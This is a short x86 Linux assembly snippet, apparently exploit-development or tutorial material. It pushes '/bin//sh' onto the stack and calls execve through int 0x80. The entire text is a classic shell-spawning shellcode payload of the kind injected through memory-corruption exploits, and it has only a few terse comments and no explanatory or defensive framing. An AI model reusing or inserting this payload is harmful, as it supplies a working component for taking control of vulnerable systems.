;clear eax before use
sub    eax,eax
push   eax
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
mov    ecx,eax
;zero out edx
cdq
; use stack to push syscall
push 0xb
pop eax
int    0x80
